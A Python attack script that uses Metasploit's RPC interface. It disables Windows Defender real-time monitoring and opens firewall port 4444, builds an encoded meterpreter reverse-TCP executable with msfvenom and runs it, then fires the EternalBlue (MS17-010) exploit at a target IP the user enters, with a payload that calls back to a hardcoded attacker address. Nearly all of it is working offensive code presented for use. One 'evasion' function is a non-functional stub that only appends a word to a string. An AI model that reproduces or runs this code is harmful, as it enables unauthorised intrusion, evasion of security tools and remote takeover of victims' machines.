import os
import subprocess
import random
from pymetasploit3.msfrpc import MsfRpcClient

# Step 1: Disable Windows Defender
def disable_windows_defender():
    try:
        print("Disabling Windows Defender real-time monitoring...")
        subprocess.run(
            "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true",
            shell=True, check=True
        )
        print("Windows Defender real-time monitoring disabled.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to disable Windows Defender. Admin privileges may be required. Error: {e}")
    except Exception as e:
        print(f"Unexpected error while disabling Windows Defender: {e}")

# Step 2: Bypass Firewall Rules
def bypass_firewall():
    try:
        print("Adding firewall rule to allow incoming traffic on port 4444...")
        subprocess.run(
            "powershell.exe New-NetFirewallRule -DisplayName 'Bypass Rule' -Direction Inbound -Protocol TCP -LocalPort 4444 -Action Allow",
            shell=True, check=True
        )
        print("Firewall rule added successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to modify firewall rules. Admin privileges may be required. Error: {e}")
    except Exception as e:
        print(f"Unexpected error while modifying firewall rules: {e}")

# Step 3: Adaptive Payload Modification
def adaptive_payload_modification(payload):
    try:
        evasion_techniques = ["encode", "obfuscate", "polymorphic", "encrypt"]
        chosen_technique = random.choice(evasion_techniques)
        print(f"Applying technique: {chosen_technique} to payload.")
        return f"{payload} {chosen_technique}"
    except Exception as e:
        print(f"Error during payload modification: {e}")
        return payload

# Step 4: Save Payload to C: Drive Using os Module
def save_payload_to_c_drive(payload_path, save_dir="C:\\Users\\Public\\Documents"):
    try:
        # Ensure the save directory exists
        if not os.path.exists(save_dir):
            os.makedirs(save_dir)
        # Define the target path
        target_path = os.path.join(save_dir, os.path.basename(payload_path))
        # Move the file to the target directory
        os.rename(payload_path, target_path)
        print(f"Payload successfully saved to: {target_path}")
        return target_path
    except FileNotFoundError as e:
        print(f"File not found: {payload_path}. Error: {e}")
    except PermissionError as e:
        print(f"Permission denied when saving to {save_dir}. Error: {e}")
    except Exception as e:
        print(f"Unexpected error when saving payload: {e}")
    return None

# Step 5: Run the Payload File Automatically
def execute_saved_payload(payload_path):
    try:
        print(f"Attempting to execute payload: {payload_path}")
        subprocess.run(payload_path, shell=True, check=True)
        print(f"Payload executed successfully: {payload_path}")
    except FileNotFoundError as e:
        print(f"Payload file not found: {payload_path}. Error: {e}")
    except PermissionError as e:
        print(f"Permission denied to execute: {payload_path}. Error: {e}")
    except subprocess.CalledProcessError as e:
        print(f"Error during payload execution. Command failed: {e}")
    except Exception as e:
        print(f"Unexpected error when executing payload: {e}")

# Step 6: Generate Encoded Payload using msfvenom
def generate_encoded_payload(lhost, lport):
    encoded_payload = "encoded_payload.exe"
    try:
        # Correct the msfvenom command with proper spaces
        subprocess.run(
            f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -e x86/shikata_ga_nai -i 5 -f exe -o {encoded_payload} -v",
            shell=True, check=True
        )
        print(f"Encoded payload generated: {encoded_payload}")
        return encoded_payload
    except subprocess.CalledProcessError as e:
        print(f"Failed to generate encoded payload. Command error: {e}")
    except Exception as e:
        print(f"Unexpected error during payload generation: {e}")
    return None

# Step 7: Execute Payload using Metasploit RPC
def execute_payload(target_ip, encoded_payload):
    try:
        client = MsfRpcClient('mawabro123', username='msf', server='127.0.0.1', port=55553)  # Connect to the RPC server
        exploit = client.modules.use('exploit', 'exploit/windows/smb/ms17_010_eternalblue')
        payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
        payload['LHOST'] = '192.168.250.136'  # Replace with your attacking IP
        payload['LPORT'] = 4444
        exploit['RHOSTS'] = target_ip
        exploit.execute(payload=payload)
        print(f"Exploit executed on {target_ip} with payload: {encoded_payload}")
    except Exception as e:
        print(f"Error during payload execution: {e}")

# Main Program
if __name__ == "__main__":
    try:
        # Input details
        target_ip = input("Enter the target IP: ")
        lhost = "192.168.250.136"  # Replace with your attacking IP
        lport = 4444

        # Step 1: Disable Defender
        disable_windows_defender()

        # Step 2: Bypass Firewall
        bypass_firewall()

        # Step 3: Generate Payload
        encoded_payload_path = generate_encoded_payload(lhost, lport)
        
        if encoded_payload_path:
            # Step 4: Save Payload to C: Drive
            saved_payload_path = save_payload_to_c_drive(encoded_payload_path)

            # Step 5: Execute Saved Payload
            if saved_payload_path:
                execute_saved_payload(saved_payload_path)

            # Step 6: Execute Exploit via Metasploit (Optional)
            execute_payload(target_ip, saved_payload_path)
    except KeyboardInterrupt:
        print("\nExecution interrupted by user.")
    except Exception as e:
        print(f"Unexpected error in the main program: {e}")
